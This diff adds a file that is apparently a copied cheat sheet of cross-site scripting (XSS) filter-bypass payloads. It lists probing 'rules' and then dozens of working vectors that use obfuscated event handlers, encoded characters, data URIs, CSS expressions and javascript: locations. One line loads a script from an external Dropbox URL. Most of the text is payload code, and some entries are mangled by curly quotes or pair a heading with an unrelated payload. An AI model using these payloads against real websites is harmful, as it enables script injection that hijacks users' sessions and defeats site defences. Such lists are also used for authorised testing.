@@ -1,0 +1,120 @@
+Source : https://securityonline.info/bypass-xss-filter/
+
+Rule 1: Injecting Harless HTML <b>, <i>, <u>
+
+Rule 2: Injecting HTML Entities
+
+<script src=”http://www.dropbox.com/s/hp796og5p9va7zt/face.js?dl=1″></script>
+
+Rule 3: Injecting Script Tag
+
+Rule 4: Testing for recursive Filters — Testing if filter is replacing malicious tags/characters with whitespaces.
+
+<src<script>ipt>alert(1);</scr</script>ipt>
+
+Rule 5: Injecting Anchor Tag
+
+<a href=””>click</a>
+
+Rule 6: Testing for event handlers
+
+Rule 7: Input less common event handlers
+
+Rule 8: Testing with src attribute
+
+Rule 9: Testing with action attribute
+
+Rule 10: Injecting HTML 5 based payloads
+
+Some technique to bypass XSS filter
+
+    Create a payload without space:
+    <h1 id=”xss”onmouseover=”prompt(1)”>a
+    <style/onload=alert(1)>
+    Use unicode
+    <p id=”\u0070rompt(1)”onmouseover=\u0065val(id)>a</p>
+    %26 instead of &
+    <a href=”data:　, &lt &NewLine; script &gt alert(1) &lt /script &gt “>CLICK #firefox
+    closing angular bracket as a value of class attribute and the purpose is to fool the parser
+    <p id=’>’onmouseover=prompt(1)>aaaa</p>
+    <p class=’>’onmouseup=confirm(1)>aaaa</p>
+    Use of “ instead of parenthesis () for function call. ES6 provides this.
+    <a style=’color:red’onmouseover=this.onmouseover=alert`1`>aaa</a>
+    Used source property of regexp object. It returns the string without slashes. The purpose is to defeat black-listed keyword confirm.
+    <a class=’xss’style=’color:red’href=’?’onmouseover=id=/confir/.source+’m’+'(1)’; onmousedown=eval(id)>click</a>
+    Use contenteditable attribute
+    <h1 class=’xss’contenteditable=”true”onkeydown=confirm(/xss/)>xss</h1>
+    Use draggable attribute
+    <p class=’xss’draggable=”true”ondragstart=alert`1`>xss</p>
+    <a class=’xss’draggable=”true”href=’?’ondragenter/ondragleave=alert`1`>xss</a>
+    Use %2f instead of /
+    <body%2fonpageshow=confirm(1)
+    <marquee%2fonstart=confirm`1`
+    Decimal encoding of character “t” == &#116 while & == %26 and # == %23
+    Hex encoding of character “t” and then URL encode & and # sign
+    Hex encoding of : (IE specific) and then URL encode & and #
+    Old Trick (IE Specific) URL = name while name == javascript:alert(1)
+    <iframe name=javascript:confirm(1) onload=”URL=name”>
+    URL=i OR any alphabet
+    <iframe/i=’javascript:alert(1)’onload=’URL=i’>
+    Use style tag if iframe tag had been blocked
+    <style/i=javascript:alert(1)’onload=’URL=i’>
+    Half-close XSS payloads
+    <div/onmouseover=confirm(1)>div</div
+    Evasion-via-data-uri-scheme
+    /* HTML5 based entities were doing good in bypassing data URI RE */
+    <a href=’data&colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+’>click</a>
+
+    <a href=’data:application/x-x509-user-cert;&NewLine;base64 NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==’>click</a>
+    /* Both are Firefox specific payloads */
+
+    /* The RE initially thinks that base64 keyword is necessary. */
+    <a href=”data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e”>click</a>
+
+    /* The RE thinks that only alphanumeric characters are allowed after data URI */
+    <a href=”data:@[‘{§(`__`)$}’]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e”>click</a>
+    Xss-style-attr
+    /* The first two payloads bypasses the check on word expression with the help of \ */
+    <div style=”x:e\x\p\r\ession(alert(1))”>div</div>
+
+    <p style=’\x:\65xpre\73sio\6e(alert(1))’>hello barracuda</p>
+
+    /* The regular expression was expecting ( after the keyword expression */
+    <div style=”width:expression\28 alert \28 1\29 \29″>I will bypass you</div>
+
+    /* Decimal Encoding without the presence of ; bypasses the regular expression */
+    <div style=”width&#58expression&#40alert&#40 1&#41&#41″>I will not match</div>
+
+    Use location property
+    <img onerror=”location=’javascript:=alert(1)'” src=”x”>
+
+    <img onerror=”location=’javascript:%61lert(1)'” src=”x”>
+
+    <img onerror=”location=’javascript:\x2561lert(1)'” src=”x”>
+
+    <img onerror=”location=’javascript:\x255Cu0061lert(1)'” src=”x” >
+
+    data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
+
+    data:html=1;alert(1)/*,<body%20onload=eval(location.href)><title>*/;alert(2) //Firefox
+
+    <base href=javascript://test/”><a href=”%0Aalert(1)”>test</a>
+
+    <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>
+
+    Edge vectors by @jackmasa
+    location.reload`javascript:alert(1)`
+
+    location.href`javascript:alert(1)`
+
+    location`javascript:alert(1)`
+    Misc vectors by @jackmasa
+    0..constructor.constructor`alert(1)“`
+
+    location.assign`javascript:alert(1)`
+
+    location.replace`javascript:alert(1)`
+
+    <a href=”” onclick=“/name==alert(1)>clickme</a>
+
+    <a href=”” onclick=“/*/alt=”*//alert(1)//”>clickme</a>
